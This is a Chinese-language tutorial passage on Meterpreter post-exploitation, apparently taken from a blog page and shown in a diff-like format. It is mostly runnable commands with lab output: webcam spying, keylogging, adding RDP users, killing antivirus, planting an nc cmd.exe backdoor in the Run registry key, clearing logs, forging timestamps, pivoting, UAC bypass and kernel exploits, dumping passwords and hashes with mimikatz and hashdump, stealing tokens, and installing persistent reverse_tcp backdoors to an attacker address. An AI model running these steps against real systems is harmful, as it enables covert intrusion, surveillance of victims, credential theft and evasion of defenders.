+webcam_snap   <span class="hljs-comment">#通过摄像头拍照</span>
+webcam_stream   <span class="hljs-comment">#通过摄像头开启视频</span>
+
+<span class="hljs-comment"># uictl开关键盘/鼠标</span>
+uictl [<span class="hljs-built_in">enable</span>/<span class="hljs-built_in">disable</span>] [keyboard/mouse/all]  <span class="hljs-comment">#开启或禁止键盘/鼠标</span>
+uictl <span class="hljs-built_in">disable</span> mouse  <span class="hljs-comment">#禁用鼠标</span>
+uictl <span class="hljs-built_in">disable</span> keyboard  <span class="hljs-comment">#禁用键盘</span>
+
+<span class="hljs-comment"># 远程桌面/截屏</span>
+enumdesktops  <span class="hljs-comment">#查看可用的桌面</span>
+getdesktop    <span class="hljs-comment">#获取当前meterpreter 关联的桌面</span>
+screenshot  <span class="hljs-comment">#截屏</span>
+use espia  <span class="hljs-comment">#或者使用espia模块截屏  然后输入screengrab</span>
+run vnc  <span class="hljs-comment">#使用vnc远程桌面连接</span>
+
+<span class="hljs-comment"># 键盘记录</span>
+keyscan_start  <span class="hljs-comment">#开始键盘记录</span>
+keyscan_dump   <span class="hljs-comment">#导出记录数据</span>
+keyscan_stop <span class="hljs-comment">#结束键盘记录</span>
+
+<span class="hljs-comment"># 添加用户，开启远程桌面</span>
+<span class="hljs-comment"># 开启rdp是通过reg修改注册表；添加用户是调用cmd.exe 通过net user添加；端口转发是利用的portfwd命令</span>
+run post/windows/manage/enable_rdp  <span class="hljs-comment">#开启远程桌面</span>
+run post/windows/manage/enable_rdp USERNAME=www2 PASSWORD=123456 <span class="hljs-comment">#添加用户</span>
+run post/windows/manage/enable_rdp FORWARD=<span class="hljs-literal">true</span> LPORT=6662  <span class="hljs-comment">#将3389端口转发到6662</span>
+
+<span class="hljs-comment"># 关闭防病毒软件</span>
+run killav
+run post/windows/manage/killav
+
+<span class="hljs-comment"># 修改注册表</span>
+reg –h <span class="hljs-comment"># 注册表命令帮助</span>
+upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32 <span class="hljs-comment">#上传nc</span>
+reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run   <span class="hljs-comment">#枚举run下的key</span>
+reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v lltest_nc -d <span class="hljs-string">'C:\windows\system32\nc.exe -Ldp 443 -e cmd.exe'</span> <span class="hljs-comment">#设置键值</span>
+reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v lltest_nc   <span class="hljs-comment">#查看键值</span>
+nc -v 192.168.81.162 443  <span class="hljs-comment">#攻击者连接nc后门</span>
+
+<span class="hljs-comment"># 清理日志</span>
+clearav  <span class="hljs-comment">#清除windows中的应用程序日志、系统日志、安全日志</span></code><div style="position: absolute; right: 4px; top: 4px; background-color: white; padding: 2px 8px; margin: 8px; border-radius: 4px; cursor: pointer; box-shadow: rgba(0, 0, 0, 0.05) 0px 2px 4px, rgba(0, 0, 0, 0.05) 0px 2px 4px; visibility: hidden;">复制</div></pre><h3><a name="cl-6"></a>4.2 文件系统命令</h3><pre style="position: relative;"><code class="lang-bash hljs">cat/ls/<span class="hljs-built_in">cd</span>/rm  <span class="hljs-comment"># 基本命令</span>
+search -f *pass* -d C:\\windows <span class="hljs-comment"># 搜索文件  -h查看帮助</span>
+getwd/<span class="hljs-built_in">pwd</span>  <span class="hljs-comment"># 获取当前目录</span>
+getlwd/lpwd   <span class="hljs-comment"># 操作攻击者主机 查看当前目录</span>
+upload /tmp/hack.txt C:\\lltest <span class="hljs-comment"># 上传文件</span>
+download c:\\lltest\\lltestpasswd.txt /tmp/  <span class="hljs-comment"># 下载文件</span>
+edit c:\\1.txt  <span class="hljs-comment"># 编辑或创建文件  没有的话，会新建文件</span>
+mkdir lltest2  <span class="hljs-comment"># 只能在当前目录下创建文件夹</span>
+rmdir lltest2  <span class="hljs-comment"># 只能删除当前目录下文件夹</span>
+lcd /tmp   <span class="hljs-comment"># 操作攻击者主机 切换目录</span>
+
+<span class="hljs-comment"># timestomp伪造文件时间戳</span>
+timestomp C:// -h   <span class="hljs-comment">#查看帮助</span>
+timestomp -v C://2.txt   <span class="hljs-comment">#查看时间戳</span>
+timestomp C://2.txt -f C://1.txt <span class="hljs-comment">#将1.txt的时间戳复制给2.txt</span></code><div style="position: absolute; right: 4px; top: 4px; background-color: white; padding: 2px 8px; margin: 8px; border-radius: 4px; cursor: pointer; box-shadow: rgba(0, 0, 0, 0.05) 0px 2px 4px, rgba(0, 0, 0, 0.05) 0px 2px 4px; visibility: hidden;">复制</div></pre><h3><a name="cl-7"></a>4.3 网络命令</h3><pre style="position: relative;"><code class="lang-bash hljs"><span class="hljs-comment"># 基本</span>
+ipconfig/ifconfig
+netstat –ano
+arp
+getproxy   <span class="hljs-comment">#查看代理信息</span>
+route   <span class="hljs-comment">#查看路由</span>
+
+<span class="hljs-comment"># portfwd端口转发</span>
+portfwd add -l 6666 -p 3389 -r 127.0.0.1 <span class="hljs-comment"># 将目标机的3389端口转发到本地6666端口</span>
+rdesktop -u Administrator -p ichunqiu 127.0.0.1:4444 <span class="hljs-comment">#然后使用rdesktop来连接，-u 用户名 -p 密码</span>
+
+
+<span class="hljs-comment"># 添加路由</span>
+
+<span class="hljs-comment"># 方式一autoroute （deprecated）</span>
+run autoroute –h <span class="hljs-comment">#查看帮助</span>
+run autoroute -s 192.168.2.0/24  <span class="hljs-comment">#添加到目标环境网络</span>
+run autoroute –p  <span class="hljs-comment">#查看添加的路由</span>
+<span class="hljs-comment"># 方式二post/multi/manage/autoroute</span>
+run post/multi/manage/autoroute CMD=autoadd <span class="hljs-comment">#自动添加到目标环境网络</span>
+run post/multi/manage/autoroute CMD=<span class="hljs-built_in">print</span> <span class="hljs-comment"># 查看添加的路由</span>
+(Specify the autoroute <span class="hljs-built_in">command</span> (Accepted: add, autoadd, <span class="hljs-built_in">print</span>, delete, default))
+
+<span class="hljs-comment"># 然后可以利用arp_scanner、portscan等进行扫描</span>
+run arp_scanner -r 192.168.2.0/24
+run post/multi/gather/ping_sweep RHOSTS=192.168.2.0/24
+run auxiliary/scanner/portscan/tcp RHOSTS=192.168.2.0
+
+<span class="hljs-comment"># autoroute添加完路由后，还可以利用msf自带的模块进行socks代理</span>
+<span class="hljs-comment"># msf提供了2个模块用来做socks代理。</span>
+<span class="hljs-comment"># auxiliary/server/socks_proxy</span>
+<span class="hljs-comment"># use auxiliary/server/socks_unc</span>
+<span class="hljs-comment"># 先background退出来，然后：</span>
+use auxiliary/server/socks_proxy
+<span class="hljs-built_in">set</span> srvhost 127.0.0.1
+<span class="hljs-built_in">set</span> srvport 1080
+run
+
+<span class="hljs-comment"># 然后vi /etc/proxychains.conf #添加 socks5 127.0.0.1 1080</span>
+<span class="hljs-comment"># 最后proxychains 使用Socks5代理访问</span>
+
+<span class="hljs-comment"># sniffer抓包</span>
+use sniffer
+sniffer_interfaces   <span class="hljs-comment">#查看网卡</span>
+sniffer_start 2   <span class="hljs-comment">#选择网卡 开始抓包</span>
+sniffer_stats 2   <span class="hljs-comment">#查看状态</span>
+sniffer_dump 2 /tmp/lltest.pcap  <span class="hljs-comment">#导出pcap数据包</span>
+sniffer_stop 2   <span class="hljs-comment">#停止抓包</span></code><div style="position: absolute; right: 4px; top: 4px; background-color: white; padding: 2px 8px; margin: 8px; border-radius: 4px; cursor: pointer; box-shadow: rgba(0, 0, 0, 0.05) 0px 2px 4px, rgba(0, 0, 0, 0.05) 0px 2px 4px; visibility: hidden;">复制</div></pre><h3><a name="cl-8"></a>4.4 信息收集</h3><pre style="position: relative;"><code class="lang-bash hljs"><span class="hljs-comment"># 信息收集的脚本位于：</span>
+<span class="hljs-comment"># modules/post/windows/gather</span>
+<span class="hljs-comment"># modules/post/linux/gather</span>
+<span class="hljs-comment"># 以下列举一些常用的</span>
+run post/windows/gather/checkvm <span class="hljs-comment">#是否虚拟机</span>
+run post/linux/gather/checkvm <span class="hljs-comment">#是否虚拟机</span>
+run post/windows/gather/forensics/enum_drives <span class="hljs-comment">#查看分区</span>
+run post/windows/gather/enum_applications <span class="hljs-comment">#获取安装软件信息</span>
+run post/windows/gather/dumplinks   <span class="hljs-comment">#获取最近的文件操作</span>
+run post/windows/gather/enum_ie  <span class="hljs-comment">#获取IE缓存</span>
+run post/windows/gather/enum_chrome   <span class="hljs-comment">#获取Chrome缓存</span>
+run post/windows/gather/enum_patches  <span class="hljs-comment">#补丁信息</span>
+run post/windows/gather/enum_domain  <span class="hljs-comment">#查找域控</span></code><div style="position: absolute; right: 4px; top: 4px; background-color: white; padding: 2px 8px; margin: 8px; border-radius: 4px; cursor: pointer; box-shadow: rgba(0, 0, 0, 0.05) 0px 2px 4px, rgba(0, 0, 0, 0.05) 0px 2px 4px; visibility: hidden;">复制</div></pre><h3><a name="cl-9"></a>4.5 提权</h3><p>1.getsystem提权<br>getsystem工作原理：<br>①getsystem创建一个新的Windows服务，设置为SYSTEM运行，当它启动时连接到一个命名管道。<br>②getsystem产生一个进程，它创建一个命名管道并等待来自该服务的连接。<br>③Windows服务已启动，导致与命名管道建立连接。<br>④该进程接收连接并调用ImpersonateNamedPipeClient，从而为SYSTEM用户创建模拟令牌。<br>然后用新收集的SYSTEM模拟令牌产生cmd.exe，并且我们有一个SYSTEM特权进程。</p><pre style="position: relative;"><code class="lang-bash hljs">getsystem  </code><div style="position: absolute; right: 4px; top: 4px; background-color: white; padding: 2px 8px; margin: 8px; border-radius: 4px; cursor: pointer; box-shadow: rgba(0, 0, 0, 0.05) 0px 2px 4px, rgba(0, 0, 0, 0.05) 0px 2px 4px; visibility: hidden;">复制</div></pre><p>2.bypassuac<br>用户帐户控制（UAC）是微软在 Windows Vista 以后版本引入的一种安全机制，有助于防止对系统进行未经授权的更改。应用程序和任务可始终在非管理员帐户的安全上下文中运行，除非管理员专门给系统授予管理员级别的访问权限。UAC 可以阻止未经授权的应用程序进行自动安装，并防止无意中更改系统设置。</p><p>msf提供了如下几个模块帮助绕过UAC：</p><pre style="position: relative;"><code class="lang-bash hljs">msf5 auxiliary(server/socks5) &gt; search bypassuac
+
+Matching Modules
+================
+
+   <span class="hljs-comment">#  Name                                              Disclosure Date  Rank       Check  Description</span>
+   -  ----                                              ---------------  ----       -----  -----------
+   0  exploit/windows/<span class="hljs-built_in">local</span>/bypassuac                   2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass
+   1  exploit/windows/<span class="hljs-built_in">local</span>/bypassuac_comhijack         1900-01-01       excellent  Yes    Windows Escalate UAC Protection Bypass (Via COM Handler Hijack)
+   2  exploit/windows/<span class="hljs-built_in">local</span>/bypassuac_eventvwr          2016-08-15       excellent  Yes    Windows Escalate UAC Protection Bypass (Via Eventvwr Registry Key)
+   3  exploit/windows/<span class="hljs-built_in">local</span>/bypassuac_fodhelper         2017-05-12       excellent  Yes    Windows UAC Protection Bypass (Via FodHelper Registry Key)
+   4  exploit/windows/<span class="hljs-built_in">local</span>/bypassuac_injection         2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection)
+   5  exploit/windows/<span class="hljs-built_in">local</span>/bypassuac_injection_winsxs  2017-04-06       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection) abusing WinSXS
+   6  exploit/windows/<span class="hljs-built_in">local</span>/bypassuac_sluihijack        2018-01-15       excellent  Yes    Windows UAC Protection Bypass (Via Slui File Handler Hijack)
+   7  exploit/windows/<span class="hljs-built_in">local</span>/bypassuac_vbs               2015-08-22       excellent  No     Windows Escalate UAC Protection Bypass (ScriptHost Vulnerability)</code><div style="position: absolute; right: 4px; top: 4px; background-color: white; padding: 2px 8px; margin: 8px; border-radius: 4px; cursor: pointer; box-shadow: rgba(0, 0, 0, 0.05) 0px 2px 4px, rgba(0, 0, 0, 0.05) 0px 2px 4px; visibility: hidden;">复制</div></pre><p>使用方法类似，运行后返回一个新的会话，<strong>需要再次执行getsystem获取系统权限</strong></p><pre style="position: relative;"><code class="lang-bash hljs"><span class="hljs-comment"># 示例</span>
+meterpreter &gt; getuid
+Server username: SAUCERMAN\TideSec
+meterpreter &gt; background
+[*] Backgrounding session 4...
+msf5 exploit(multi/handler) &gt;  use exploit/windows/<span class="hljs-built_in">local</span>/bypassuac
+msf5 exploit(windows/<span class="hljs-built_in">local</span>/bypassuac) &gt; <span class="hljs-built_in">set</span> SESSION 4
+SESSION =&gt; 4
+msf5 exploit(windows/<span class="hljs-built_in">local</span>/bypassuac) &gt; run
+
+[-] Handler failed to <span class="hljs-built_in">bind</span> to 192.168.81.160:4444:-  -
+[-] Handler failed to <span class="hljs-built_in">bind</span> to 0.0.0.0:4444:-  -
+[*] UAC is Enabled, checking level...
+[+] UAC is <span class="hljs-built_in">set</span> to Default
+[+] BypassUAC can bypass this setting, continuing...
+[+] Part of Administrators group! Continuing...
+[*] Uploaded the agent to the filesystem....
+[*] Uploading the bypass UAC executable to the filesystem...
+[*] Meterpreter stager executable 73802 bytes long being uploaded..
+[*] Sending stage (206403 bytes) to 192.168.81.154
+[*] Meterpreter session 5 opened (192.168.81.160:4444 -&gt; 192.168.81.154:1134) at 2019-06-12 06:31:11 -0700
+[-] Exploit failed [timeout-expired]: Timeout::Error execution expired
+[*] Exploit completed, but no session was created.
+
+<span class="hljs-comment"># 然后返回新的meterpreter会话，继续执行getsystem本应该会提权成功</span>
+<span class="hljs-comment"># 然鹅这里失败了</span></code><div style="position: absolute; right: 4px; top: 4px; background-color: white; padding: 2px 8px; margin: 8px; border-radius: 4px; cursor: pointer; box-shadow: rgba(0, 0, 0, 0.05) 0px 2px 4px, rgba(0, 0, 0, 0.05) 0px 2px 4px; visibility: hidden;">复制</div></pre><p>3.内核漏洞提权</p><p>无论是linux还是windows都出过很多高危的漏洞，我们可以利用它们进行权限提升，比如windows系统的ms13-081、ms15-051、ms16-032、ms17-010等，msf也集成了这些漏洞的利用模块。</p><pre style="position: relative;"><code class="lang-bash hljs">meterpreter &gt; run post/windows/gather/enum_patches  <span class="hljs-comment">#查看补丁信息</span>
+msf5 &gt; use exploit/windows/<span class="hljs-built_in">local</span>/ms13_053_schlamperei
+msf5 &gt; <span class="hljs-built_in">set</span> SESSION 2
+msf5 &gt; exploit
+
+<span class="hljs-comment"># 示例</span>
+meterpreter &gt; run post/windows/gather/enum_patches
+
+[+] KB2871997 is missing
+[+] KB2928120 is missing
+[+] KB977165 - Possibly vulnerable to MS10-015 kitrap0d <span class="hljs-keyword">if</span> Windows 2K SP4 - Windows 7 (x86)
+[+] KB2305420 - Possibly vulnerable to MS10-092 schelevator <span class="hljs-keyword">if</span> Vista, 7, and 2008
+[+] KB2592799 - Possibly vulnerable to MS11-080 afdjoinleaf <span class="hljs-keyword">if</span> XP SP2/SP3 Win 2k3 SP2
+[+] KB2778930 - Possibly vulnerable to MS13-005 hwnd_broadcast, elevates from Low to Medium integrity
+[+] KB2850851 - Possibly vulnerable to MS13-053 schlamperei <span class="hljs-keyword">if</span> x86 Win7 SP0/SP1
+[+] KB2870008 - Possibly vulnerable to MS13-081 track_popup_menu <span class="hljs-keyword">if</span> x86 Windows 7 SP0/SP1
+meterpreter &gt; background
+[*] Backgrounding session 4...
+msf5 exploit(windows/<span class="hljs-built_in">local</span>/bypassuac) &gt; search MS13-081
+
+Matching Modules
+================
+
+   <span class="hljs-comment">#  Name                                             Disclosure Date  Rank     Check  Description</span>
+   -  ----                                             ---------------  ----     -----  -----------
+   0  exploit/windows/<span class="hljs-built_in">local</span>/ms13_081_track_popup_menu  2013-10-08       average  Yes    Windows TrackPopupMenuEx Win32k NULL Page
+
+
+msf5 exploit(windows/<span class="hljs-built_in">local</span>/bypassuac) &gt; use exploit/windows/<span class="hljs-built_in">local</span>/ms13_081_track_popup_menu
+msf5 exploit(windows/<span class="hljs-built_in">local</span>/ms13_081_track_popup_menu) &gt; <span class="hljs-built_in">set</span> session 4
+session =&gt; 4
+msf5 exploit(windows/<span class="hljs-built_in">local</span>/ms13_081_track_popup_menu) &gt; exploit
+
+[!] SESSION may not be compatible with this module.
+[-] Handler failed to <span class="hljs-built_in">bind</span> to 192.168.81.160:4444:-  -
+[-] Handler failed to <span class="hljs-built_in">bind</span> to 0.0.0.0:4444:-  -
+[-] Exploit aborted due to failure: no-target: Running against 64-bit systems is not supported
+[*] Exploit completed, but no session was created.
+<span class="hljs-comment"># 然鹅失败了，摸摸头</span></code><div style="position: absolute; right: 4px; top: 4px; background-color: white; padding: 2px 8px; margin: 8px; border-radius: 4px; cursor: pointer; box-shadow: rgba(0, 0, 0, 0.05) 0px 2px 4px, rgba(0, 0, 0, 0.05) 0px 2px 4px; visibility: hidden;">复制</div></pre><h3><a name="cl-10"></a>4.6 获取凭证</h3><p>在内网环境中，一个管理员可能管理多台服务器，他使用的密码有可能相同或者有规律，如果能够得到密码或者hash，再尝试登录内网其它服务器，可能取得意想不到的效果。</p><p>1.使用mimikatz</p><pre style="position: relative;"><code class="lang-bash hljs">load mimikatz    <span class="hljs-comment">#help mimikatz 查看帮助</span>
+wdigest  <span class="hljs-comment">#获取Wdigest密码</span>
+mimikatz_command -f samdump::hashes  <span class="hljs-comment">#执行mimikatz原始命令</span>
+mimikatz_command -f sekurlsa::searchPasswords
+
+<span class="hljs-comment"># 示例</span>
+meterpreter &gt; load mimikatz
+Loading extension mimikatz...[!] Loaded Mimikatz on a newer OS (Windows 7 (Build 7601, Service Pack 1).). Did you mean to <span class="hljs-string">'load kiwi'</span> instead?
+Success.
+meterpreter &gt; wdigest
+[!] Not currently running as SYSTEM
+[*] Attempting to getprivs ...
+[+] Got SeDebugPrivilege.
+[*] Retrieving wdigest credentials
+wdigest credentials
+===================
+
+AuthID    Package    Domain        User           Password
+------    -------    ------        ----           --------
+0;997     Negotiate  NT AUTHORITY  LOCAL SERVICE  
+0;996     Negotiate  WORKGROUP     SAUCERMAN$     
+0;48748   NTLM                                    
+0;999     NTLM       WORKGROUP     SAUCERMAN$     
+0;476238  NTLM       SAUCERMAN     TideSec        123456
+0;476209  NTLM       SAUCERMAN     TideSec        123456
+
+meterpreter &gt; mimikatz_command -f samdump::hashes
+Ordinateur : saucerman
+BootKey    : 691cff33caf49e933be97fcee370256a
+RegOpenKeyEx SAM : (0x00000005) �ݿ� 
+Erreur lors de l<span class="hljs-string">'exploration du registre
+meterpreter &gt; mimikatz_command -f sekurlsa::searchPasswords
+[0] { TideSec ; SAUCERMAN ; 123456 }
+[1] { TideSec ; SAUCERMAN ; 123456 }
+[2] { SAUCERMAN ; TideSec ; 123456 }
+[3] { SAUCERMAN ; TideSec ; 123456 }
+[4] { TideSec ; SAUCERMAN ; 123456 }
+[5] { TideSec ; SAUCERMAN ; 123456 }</span></code><div style="position: absolute; right: 4px; top: 4px; background-color: white; padding: 2px 8px; margin: 8px; border-radius: 4px; cursor: pointer; box-shadow: rgba(0, 0, 0, 0.05) 0px 2px 4px, rgba(0, 0, 0, 0.05) 0px 2px 4px; visibility: hidden;">复制</div></pre><ol start="2"><li>使用meterpreter的run hashdump命令</li></ol><pre style="position: relative;"><code class="lang-bash hljs">meterpreter &gt; run hashdump
+
+[!] Meterpreter scripts are deprecated. Try post/windows/gather/smart_hashdump.
+[!] Example: run post/windows/gather/smart_hashdump OPTION=value [...]
+[*] Obtaining the boot key...
+[*] Calculating the hboot key using SYSKEY 691cff33caf49e933be97fcee370256a...
+/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:134: warning: constant OpenSSL::Cipher::Cipher is deprecated
+[*] Obtaining the user list and keys...
+[*] Decrypting user keys...
+/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:268: warning: constant OpenSSL::Cipher::Cipher is deprecated
+/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:272: warning: constant OpenSSL::Cipher::Cipher is deprecated
+/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:279: warning: constant OpenSSL::Cipher::Cipher is deprecated
+[*] Dumping password hints...
+
+TideSec:<span class="hljs-string">"123456"</span>
+
+[*] Dumping password hashes...
+
+
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+TideSec:1000:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::</code><div style="position: absolute; right: 4px; top: 4px; background-color: white; padding: 2px 8px; margin: 8px; border-radius: 4px; cursor: pointer; box-shadow: rgba(0, 0, 0, 0.05) 0px 2px 4px, rgba(0, 0, 0, 0.05) 0px 2px 4px; visibility: hidden;">复制</div></pre><p>3.post/windows/gather/smart_hashdump</p><p>从上面也可以看出官方推荐<code>post/windows/gather/smart_hashdump</code></p><pre style="position: relative;"><code class="lang-bash hljs">meterpreter &gt; run post/windows/gather/smart_hashdump
+
+[*] Running module against SAUCERMAN
+[*] Hashes will be saved to the database <span class="hljs-keyword">if</span> one is connected.
+[+] Hashes will be saved <span class="hljs-keyword">in</span> loot <span class="hljs-keyword">in</span> JtR password file format to:
+[*] /home/ubuntu/.msf4/loot/20190612084715_default_192.168.81.154_windows.hashes_439550.txt
+[*] Dumping password hashes...
+[*] Running as SYSTEM extracting hashes from registry
+[*]     Obtaining the boot key...
+[*]     Calculating the hboot key using SYSKEY 691cff33caf49e933be97fcee370256a...
+[*]     Obtaining the user list and keys...
+[*]     Decrypting user keys...
+[*]     Dumping password hints...
+[+]     TideSec:<span class="hljs-string">"123456"</span>
+[*]     Dumping password hashes...
+[+]     Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[+]     TideSec:1000:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::</code><div style="position: absolute; right: 4px; top: 4px; background-color: white; padding: 2px 8px; margin: 8px; border-radius: 4px; cursor: pointer; box-shadow: rgba(0, 0, 0, 0.05) 0px 2px 4px, rgba(0, 0, 0, 0.05) 0px 2px 4px; visibility: hidden;">复制</div></pre><p>4.powerdump<br>同 hashdump，但失败了</p><pre style="position: relative;"><code class="lang-bash hljs">meterpreter &gt; run powerdump
+[*] PowerDump v0.1 - PowerDump to extract Username and Password Hashes...
+[*] Running PowerDump to extract Username and Password Hashes...
+[*] Uploaded PowerDump as 69921.ps1 to %TEMP%...
+[*] Setting ExecutionPolicy to Unrestricted...
+[*] Dumping the SAM database through PowerShell...
+
+[-] Could not execute powerdump: Rex::Post::Meterpreter::RequestError core_channel_open: Operation failed: The system cannot find the file specified.</code><div style="position: absolute; right: 4px; top: 4px; background-color: white; padding: 2px 8px; margin: 8px; border-radius: 4px; cursor: pointer; box-shadow: rgba(0, 0, 0, 0.05) 0px 2px 4px, rgba(0, 0, 0, 0.05) 0px 2px 4px; visibility: hidden;">复制</div></pre><h3><a name="cl-11"></a>4.7 假冒令牌</h3><p>在用户登录windows操作系统时，系统都会给用户分配一个令牌(Token)，当用户访问系统资源时都会使用这个令牌进行身份验证，功能类似于网站的session或者cookie。</p><p>msf提供了一个功能模块可以让我们假冒别人的令牌，实现身份切换，如果目标环境是域环境，刚好域管理员登录过我们已经有权限的终端，那么就可以假冒成域管理员的角色。</p><pre style="position: relative;"><code class="lang-bash hljs"><span class="hljs-comment"># 1.incognito假冒令牌</span>
+use incognito      <span class="hljs-comment">#help incognito  查看帮助</span>
+list_tokens -u    <span class="hljs-comment">#查看可用的token</span>
+impersonate_token <span class="hljs-string">'NT AUTHORITY\SYSTEM'</span>  <span class="hljs-comment">#假冒SYSTEM token</span>
+或者impersonate_token NT\ AUTHORITY\\SYSTEM <span class="hljs-comment">#不加单引号 需使用\\</span>
+execute -f cmd.exe -i –t    <span class="hljs-comment"># -t 使用假冒的token 执行</span>
+或者直接shell
+rev2self   <span class="hljs-comment">#返回原始token</span>
+
+<span class="hljs-comment"># 2.steal_token窃取令牌</span>
+steal_token &lt;pid值&gt;   <span class="hljs-comment">#从指定进程中窃取token   先ps</span>
+drop_token  <span class="hljs-comment">#删除窃取的token</span></code><div style="position: absolute; right: 4px; top: 4px; background-color: white; padding: 2px 8px; margin: 8px; border-radius: 4px; cursor: pointer; box-shadow: rgba(0, 0, 0, 0.05) 0px 2px 4px, rgba(0, 0, 0, 0.05) 0px 2px 4px; visibility: hidden;">复制</div></pre><h3><a name="cl-12"></a>4.8 植入后门</h3><p>Meterpreter仅仅是在内存中驻留的Shellcode，只要目标机器重启就会丧失控制权，下面就介绍如何植入后门，维持控制。</p><p>1.persistence启动项后门</p><p>路径：metasploit/scripts/meterpreter/persistence</p><p>原理是在<code>C:\Users***\AppData\Local\Temp\</code>目录下，上传一个vbs脚本，在注册表<code>HKLM\Software\Microsoft\Windows\CurrentVersion\Run\</code>加入开机启动项，<strong>很容易被杀软拦截，官方不推荐</strong></p><pre style="position: relative;"><code class="lang-bash hljs">run persistence –h  <span class="hljs-comment">#查看帮助</span>
+run persistence -X -i 5 -p 4444 -r 192.168.81.160
+<span class="hljs-comment">#-X指定启动的方式为开机自启动，-i反向连接的时间间隔(5s) –r 指定攻击者的ip</span>
+<span class="hljs-comment"># 示例</span>
+meterpreter &gt; run persistence -X -i 5 -p 4444 -r 192.168.81.160
+
+[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.
+[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]
+[*] Running Persistence Script
+[*] Resource file <span class="hljs-keyword">for</span> cleanup created at /home/ubuntu/.msf4/logs/persistence/SAUCERMAN_20190612.4235/SAUCERMAN_20190612.4235.rc
+[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.81.160 LPORT=4444
+[*] Persistent agent script is 99630 bytes long
+[+] Persistent Script written to C:\Users\TideSec\AppData\Local\Temp\qexwcMF.vbs
+[*] Executing script C:\Users\TideSec\AppData\Local\Temp\qexwcMF.vbs
+[+] Agent executed with PID 3540
+[*] Installing into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\qrsXZuPqVbEgua
+[+] Installed into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\qrsXZuPqVbEgua</code><div style="position: absolute; right: 4px; top: 4px; background-color: white; padding: 2px 8px; margin: 8px; border-radius: 4px; cursor: pointer; box-shadow: rgba(0, 0, 0, 0.05) 0px 2px 4px, rgba(0, 0, 0, 0.05) 0px 2px 4px; visibility: hidden;">复制</div></pre><p>能实现同样功能的脚本还有：exploit/windows/local/persistence</p><p>2.metsvc服务后门</p><p>在C:\Users<em>*</em>\AppData\Local\Temp\目录下，上传一个vbs脚本<br>在注册表HKLM\Software\Microsoft\Windows\CurrentVersion\Run\加入开机启动项。<strong>通过服务启动，需要管理员权限，官方不推荐使用，运行失败</strong></p><pre style="position: relative;"><code class="lang-bash hljs">run metsvc –A   <span class="hljs-comment">#自动安装后门</span>
+
+<span class="hljs-comment"># 示例</span>
+meterpreter &gt; run metsvc –A
+
+[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.
+[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]
+[*] Creating a meterpreter service on port 31337
+[*] Creating a temporary installation directory C:\Users\TideSec\AppData\Local\Temp\iInvhjKZbLH...
+[*]  &gt;&gt; Uploading metsrv.x86.dll...
+[*]  &gt;&gt; Uploading metsvc-server.exe...
+[*]  &gt;&gt; Uploading metsvc.exe...
+[*] Starting the service...
+    Cannot open service manager (0x00000005)
+
+meterpreter &gt; ls
+Listing: C:\Users\TideSec\AppData\Local\Temp\iInvhjKZbLH
+========================================================
+
+Mode              Size    Type  Last modified              Name
+----              ----    ----  -------------              ----
+100666/rw-rw-rw-  178688  fil   2019-06-12 06:46:20 -0700  metsrv.dll
+100777/rwxrwxrwx  45056   fil   2019-06-12 06:46:21 -0700  metsvc-server.exe
+100777/rwxrwxrwx  61440   fil   2019-06-12 06:46:21 -0700  metsvc.exe</code><div style="position: absolute; right: 4px; top: 4px; background-color: white; padding: 2px 8px; margin: 8px; border-radius: 4px; cursor: pointer; box-shadow: rgba(0, 0, 0, 0.05) 0px 2px 4px, rgba(0, 0, 0, 0.05) 0px 2px 4px; visibility: hidden;">复制</div></pre><p>三个文件上传成功，但服务没有启动起来，失败了。使用<code>-r</code>参数可卸载服务。</p><p>3.persistence_exe</p><p>再来看看官方推荐的东西吧</p><pre style="position: relative;"><code class="lang-bash hljs">meterpreter &gt; info post/windows/manage/persistence_exe
+
+       Name: Windows Manage Persistent EXE Payload Installer
+     Module: post/windows/manage/persistence_exe
+   Platform: Windows
+       Arch: 
+       Rank: Normal
+
+Provided by:
+  Merlyn drforbin Cousins &lt;drforbin6@gmail.com&gt;
+
+Compatible session types:
+  Meterpreter
+
+Basic options:
+  Name      Current Setting  Required  Description
+  ----      ---------------  --------  -----------
+  REXENAME  default.exe      yes       The name to call exe on remote system
+  REXEPATH                   yes       The remote executable to upload and execute.
+  SESSION                    yes       The session to run this module on.
+  STARTUP   USER             yes       Startup <span class="hljs-built_in">type</span> <span class="hljs-keyword">for</span> the persistent payload. (Accepted: USER, SYSTEM, SERVICE)
+
+Description:
+  This Module will upload an executable to a remote host and make it 
+  Persistent. It can be installed as USER, SYSTEM, or SERVICE. USER 
+  will start on user login, SYSTEM will start on system boot but 
+  requires privs. SERVICE will create a new service <span class="hljs-built_in">which</span> will start 
+  the payload. Again requires privs.
+
+
+
+Module options (post/windows/manage/persistence_exe):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   REXENAME  default.exe      yes       The name to call exe on remote system
+   REXEPATH                   yes       The remote executable to upload and execute.
+   SESSION                    yes       The session to run this module on.
